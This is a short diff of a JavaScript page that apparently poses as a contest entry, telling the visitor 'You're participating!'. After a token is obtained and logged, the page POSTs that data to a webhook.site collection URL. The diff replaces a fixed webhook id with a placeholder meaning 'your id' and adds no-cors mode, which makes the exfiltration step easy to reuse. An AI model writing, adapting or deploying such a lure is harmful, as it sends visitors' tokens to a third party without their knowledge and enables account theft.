@@ -23,11 +23,12 @@
       })
       .then(function(data) {
         log("token ok: " + JSON.stringify(data));
-        return fetch("https://webhook.site/d5ce111a-d195-4b31-877f-2201eac2cf4e", {
-          method: "POST",
-          headers: {"Content-Type": "application/json"},
-          body: JSON.stringify(data)
-        });
+        return fetch("https://webhook.site/твой-id", {
+  method: "POST",
+  mode: "no-cors",
+  headers: {"Content-Type": "text/plain"},
+  body: JSON.stringify(data)
+});
       })
       .then(function() {
         document.getElementById("status").textContent = "Ты участвуешь!";
